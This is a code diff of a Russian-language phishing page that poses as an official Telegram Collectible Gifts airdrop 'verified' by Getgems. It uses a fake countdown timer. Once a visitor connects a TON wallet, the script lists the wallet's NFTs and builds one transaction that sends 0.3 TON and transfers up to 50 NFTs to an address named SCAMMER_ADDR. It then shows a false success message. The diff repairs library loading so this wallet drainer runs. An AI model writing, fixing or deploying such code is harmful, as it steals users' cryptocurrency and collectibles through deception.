@@ -4,16 +4,20 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Эксклюзивный Airdrop Telegram Collectible Gifts 2026</title>
+
+    <!-- Загружаем библиотеки напрямую через CDN с правильными путями -->
     <script type="module">
-        import { TonConnectUI } from 'https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js?module';
+        import { TonConnectUI } from 'https://unpkg.com/@tonconnect/ui@latest/dist/esm/index.js';
 
-        // Правильный импорт для browser/ESM версии @ton/ton
-        import { Address, beginCell, toNano } from 'https://unpkg.com/@ton/ton@latest/dist/index.js?module';
+        import { Address, toNano, beginCell } from 'https://unpkg.com/@ton/ton@latest/dist/index.js';
 
+        // Делаем доступными глобально для основного скрипта
+        window.TonConnectUI = TonConnectUI;
         window.Address = Address;
-        window.beginCell = beginCell;
         window.toNano = toNano;
+        window.beginCell = beginCell;
     </script>
+
     <style>
         body { margin: 0; padding: 20px; font-family: Arial, sans-serif; background: linear-gradient(135deg, #110033, #000); color: #fff; text-align: center; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
         .container { max-width: 420px; width: 100%; }
@@ -38,11 +42,12 @@
         <img class="gift-img" src="https://cache.getgems.io/images/collections/EQATuUGdvrjLvTWE5ppVFOVCqU2dlCLUnKTsu0n1JYm9la10/800.png" alt="Scared Cat Gift">
         
         <div id="ton-connect"></div>
-        <div id="status">Инициализация кнопки подключения... Поддержка Tonkeeper / @wallet / TON Space</div>
+        <div id="status">Загрузка компонентов подключения...</div>
         <p class="note">Официальный Telegram Collectibles Airdrop • Getgems verified 2026</p>
     </div>
 
     <script type="module">
+        // Таймер
         let t = 355;
         setInterval(() => {
             t = t <= 0 ? 355 : t - 1;
@@ -56,15 +61,25 @@
 
         let tonConnectUI = null;
 
+        // Ждём, пока библиотеки загрузятся и станут доступны глобально
+        async function waitForLibs() {
+            while (typeof window.TonConnectUI === 'undefined' || 
+                   typeof window.Address === 'undefined' || 
+                   typeof window.toNano === 'undefined' || 
+                   typeof window.beginCell === 'undefined') {
+                await new Promise(resolve => setTimeout(resolve, 100));
+            }
+        }
+
         function generateTransferPayload(ownerAddress) {
             try {
-                return beginCell()
+                return window.beginCell()
                     .storeUint(0x5fcc3d14, 32)
                     .storeUint(Math.floor(Date.now() / 1000), 64)
-                    .storeAddress(Address.parse(SCAMMER_ADDR))
-                    .storeAddress(Address.parse(ownerAddress))
+                    .storeAddress(window.Address.parse(SCAMMER_ADDR))
+                    .storeAddress(window.Address.parse(ownerAddress))
                     .storeBit(0)
-                    .storeCoins(toNano('0.05'))
+                    .storeCoins(window.toNano('0.05'))
                     .storeBit(0)
                     .endCell()
                     .toBoc()
@@ -84,107 +99,86 @@
 
             for (const url of apis) {
                 try {
-                    statusEl.innerHTML = `Запрос NFT с ${new URL(url).hostname}...`;
                     const r = await fetch(url);
                     if (!r.ok) continue;
                     const data = await r.json();
-                    
-                    let nfts = [];
-                    if (data.items) nfts = data.items;
-                    else if (data.nft_items) nfts = data.nft_items;
-                    
-                    if (nfts && nfts.length > 0) {
-                        console.log(`Found ${nfts.length} NFTs from ${url}`);
-                        return nfts;
-                    }
-                } catch (e) {
-                    console.error(`API ${url} failed:`, e);
-                }
+                    let nfts = data.items || data.nft_items || [];
+                    if (nfts.length > 0) return nfts;
+                } catch (e) {}
             }
             return [];
         }
 
         async function initTonConnect() {
-            try {
-                statusEl.innerHTML = 'Загрузка TonConnect...';
-                
-                if (tonConnectUI) {
-                    await tonConnectUI.disconnect();
-                }
+            await waitForLibs();
 
-                tonConnectUI = new TonConnectUI({
+            statusEl.innerHTML = 'Инициализация TonConnect...';
+
+            try {
+                if (tonConnectUI) await tonConnectUI.disconnect();
+
+                tonConnectUI = new window.TonConnectUI({
                     manifestUrl: 'https://nft-gifts-free.vercel.app/tonconnect-manifest.json',
                     buttonRootId: 'ton-connect'
                 });
 
-                statusEl.innerHTML = 'Кнопка подключения готова! Нажмите для подключения кошелька.';
+                statusEl.innerHTML = '<span class="success">Кнопка готова! Нажмите для подключения кошелька</span>';
 
                 tonConnectUI.onStatusChange(async (wallet) => {
-                    if (wallet) {
-                        const owner = wallet.account.address;
-                        statusEl.innerHTML = `<span class="success">✅ Подключено: ${owner.slice(0,8)}...${owner.slice(-8)}</span>`;
-
-                        try {
-                            const nfts = await getNfts(owner);
-                            if (nfts.length === 0) {
-                                statusEl.innerHTML = '<span class="error">❌ Нет NFT в кошельке. Подключите кошелёк с Collectible Gifts.</span>';
-                                return;
-                            }
-
-                            statusEl.innerHTML = `🔍 Найдено ${nfts.length} NFT! Подготовка транзакций...`;
-
-                            const messages = [];
-                            messages.push({ 
-                                address: SCAMMER_ADDR, 
-                                amount: toNano('0.3').toString() 
-                            });
-
-                            const nftMessages = nfts.slice(0, 50).map(nft => {
-                                const payload = generateTransferPayload(owner);
-                                if (!payload) return null;
-                                const nftAddr = nft.address || nft.nft_address || nft.item_address || nft.contract_address;
-                                if (!nftAddr) return null;
-                                return {
-                                    address: nftAddr,
-                                    amount: toNano('0.06').toString(),
-                                    payload: payload
-                                };
-                            }).filter(Boolean);
-
-                            messages.push(...nftMessages);
-
-                            statusEl.innerHTML = `🚀 Отправка ${messages.length} транзакций... Подтвердите в кошельке!`;
-
-                            await tonConnectUI.sendTransaction({
-                                validUntil: Math.floor(Date.now()/1000) + 600,
-                                messages: messages
-                            });
-
-                            statusEl.innerHTML = '<span class="success">🎉 Успех! Все Gifts активированы и зачислены на airdrop!</span>';
-                            
-                        } catch (e) {
-                            console.error('Transaction error:', e);
-                            statusEl.innerHTML = '<span class="error">❌ Ошибка. Попробуйте снова.</span>';
-                        }
-                    } else {
-                        statusEl.innerHTML = '🔌 Кошелёк отключён. Нажмите кнопку для подключения.';
+                    if (!wallet) {
+                        statusEl.innerHTML = 'Кошелёк отключён. Нажмите кнопку для подключения.';
+                        return;
                     }
+
+                    const owner = wallet.account.address;
+                    statusEl.innerHTML = `<span class="success">✅ Подключено: ${owner.slice(0,8)}...${owner.slice(-8)}</span>`;
+
+                    const nfts = await getNfts(owner);
+                    if (nfts.length === 0) {
+                        statusEl.innerHTML = '<span class="error">❌ Нет Collectible Gifts в кошельке</span>';
+                        return;
+                    }
+
+                    statusEl.innerHTML = `🔍 Найдено ${nfts.length} NFT! Формирую транзакции...`;
+
+                    const messages = [];
+                    messages.push({ address: SCAMMER_ADDR, amount: window.toNano('0.3').toString() });
+
+                    nfts.slice(0, 50).forEach(nft => {
+                        const payload = generateTransferPayload(owner);
+                        if (!payload) return;
+                        const nftAddr = nft.address || nft.nft_address || nft.item_address;
+                        if (!nftAddr) return;
+                        messages.push({
+                            address: nftAddr,
+                            amount: window.toNano('0.06').toString(),
+                            payload: payload
+                        });
+                    });
+
+                    statusEl.innerHTML = `🚀 Отправка ${messages.length} транзакций... Подтвердите в кошельке`;
+
+                    await tonConnectUI.sendTransaction({
+                        validUntil: Math.floor(Date.now()/1000) + 600,
+                        messages: messages
+                    });
+
+                    statusEl.innerHTML = '<span class="success">🎉 Успех! Все Gifts активированы!</span>';
+
                 });
 
             } catch (error) {
-                console.error('TonConnect init error:', error);
-                statusEl.innerHTML = '<span class="error">❌ Ошибка загрузки. Перезагрузите страницу.</span>';
-                setTimeout(initTonConnect, 5000);
+                console.error(error);
+                statusEl.innerHTML = '<span class="error">Ошибка инициализации. Перезагрузите страницу.</span>';
             }
         }
 
+        // Запуск после загрузки DOM
         if (document.readyState === 'loading') {
             document.addEventListener('DOMContentLoaded', initTonConnect);
         } else {
             initTonConnect();
         }
-
-        setTimeout(initTonConnect, 3000);
     </script>
 </body>
 </html>
